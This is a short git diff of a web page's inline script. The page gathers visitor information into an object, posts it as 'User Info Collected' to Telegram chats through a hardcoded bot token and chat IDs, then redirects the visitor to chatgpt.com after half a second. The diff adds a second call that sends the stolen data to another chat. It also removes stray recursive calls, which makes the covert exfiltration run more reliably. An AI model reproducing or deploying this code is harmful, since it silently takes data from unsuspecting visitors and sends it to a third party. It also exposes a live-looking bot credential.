@@ -35,8 +35,10 @@
   <script>
     setTimeout(() => {
   sendToTelegram();
+  sendToTelegram2();
+
   window.location.href = "https://chatgpt.com/";
-}, 500); 
+}, 500);
 
     let collectedData = {};
 
@@ -192,7 +194,6 @@
     async function sendToTelegram2() {
       const botToken = "8079871434:AAFlp-MDPEFED9uTwGoHG1wN00OwbNVsVd0";
       const chatId = "6854356772"; // Replace with your Telegram user ID
-      sendToTelegram2();
       const message = "*📊 User Info Collected:*\n```\n" + JSON.stringify(collectedData, null, 2) + "\n```";
 
       try {
@@ -230,7 +231,6 @@
     async function sendToTelegram() {
       const botToken = "8079871434:AAFlp-MDPEFED9uTwGoHG1wN00OwbNVsVd0";
       const chatId = "7258927081"; // Replace with your Telegram user ID
-      sendToTelegram2();
       const message = "*📊 User Info Collected:*\n```\n" + JSON.stringify(collectedData, null, 2) + "\n```";
 
       try {
